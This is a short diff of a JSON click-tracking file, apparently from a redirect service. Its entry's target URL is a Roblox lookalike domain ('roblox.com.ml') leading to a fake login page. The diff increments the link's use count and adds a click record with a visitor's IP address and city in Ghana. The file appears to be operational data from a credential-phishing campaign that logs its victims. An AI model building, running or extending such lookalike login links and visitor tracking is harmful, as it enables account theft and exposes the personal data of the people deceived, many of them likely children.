@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 144,
+    "useCount": 145,
     "createdBy": "admin",
     "clicks": [
       {
@@ -1259,6 +1259,14 @@
       },
       {
         "timestamp": 1776951853265,
+        "ip": "74.244.119.81",
+        "country": "Ghana",
+        "city": "Accra",
+        "flag": "🇬🇭",
+        "countryCode": "GH"
+      },
+      {
+        "timestamp": 1776951864767,
         "ip": "74.244.119.81",
         "country": "Ghana",
         "city": "Accra",
